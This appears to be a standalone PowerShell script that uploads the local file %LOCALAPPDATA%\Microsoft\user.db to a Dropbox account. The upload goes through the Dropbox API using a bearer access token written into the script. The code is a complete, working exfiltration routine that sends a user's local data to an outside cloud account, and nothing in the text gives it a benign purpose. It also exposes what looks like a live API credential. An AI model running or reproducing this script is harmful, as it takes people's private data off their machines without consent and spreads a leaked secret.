# Set the path to the file to upload
$fileToUpload = "$env:LOCALAPPDATA\Microsoft\user.db"

# Set the Dropbox access token
$accessToken = "sl.Bbq6L1ZIPtJV0ID5nl4MnGZx7eBPt2jN5V5veeT3trsvp5sKQqy1DKcKcRrvbgryGcGlvY_b3WzEBLqV_Crs1LhghOmy5PH_3zxNItMadvX-PTA1PQZIFfib1JLYaayx1gI8pZVvXd0"

# Set the Dropbox API endpoint
$dropboxApiEndpoint = "https://content.dropboxapi.com/2/files/upload"

# Set the Dropbox API headers
$dropboxApiHeaders = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = '{"path":"/user.db","mode":"add","autorename":true,"mute":false}'
    "Content-Type" = "application/octet-stream"
}

# Upload the file to Dropbox
Invoke-RestMethod -Method POST -Uri $dropboxApiEndpoint -Headers $dropboxApiHeaders -InFile $fileToUpload
